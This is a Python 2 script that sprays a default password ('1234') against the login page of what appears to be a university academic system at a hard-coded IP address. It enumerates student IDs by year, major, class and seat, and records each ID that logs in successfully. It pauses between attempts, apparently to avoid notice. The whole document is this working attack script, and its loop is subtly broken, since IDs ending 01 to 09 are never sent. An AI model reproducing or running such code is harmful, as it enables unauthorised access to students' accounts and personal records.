import urllib
import httplib
import time
reqheaders={
"Accept":"text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8",
"Host": "222.194.15.1:7777",
"Content-Type": "application/x-www-form-urlencoded",
"Connection": "Keep-Alive"
}
conn=httplib.HTTPConnection('222.194.15.1:7777')
stuid=""
year=["15","17","16","18"]
major1=["01","02","03","04","05","06","07","08","09","10","11","12","13"]
major2=["0","1","2"]
room=["01","02","03","04"]
reqdata={"stuid":"","pwd":"1234"}
cnt=0
try:
    for y in year:
        for m1 in major1:
            fh=open( "file/"+y+m1 ,"w")
            for m2 in major2:
                for r in room:
                    stuid=y+m1+m2+r
                    fh.write("\n\n"+stuid+"\n\n")
                    for c in range(1,31):
                        if c<10:
                            reqdata["stuid"]=stuid+'0'+str(c)
                        else:
                            reqdata["stuid"]=stuid+str(c)
                            data=urllib.urlencode(reqdata)
                            conn.request('POST','/pls/wwwbks/bks_login2.login?jym2005=5346.022480888888',data,reqheaders)
                            res=conn.getresponse()
                            if res.status==302:
                                fh.write(reqdata["stuid"]+"\n")
                                cnt=cnt+1
                                if cnt%10==0:
                                    print(cnt)
                            res.read()
                            time.sleep(2)
            fh.close()
except IOError:
    print "Error:"
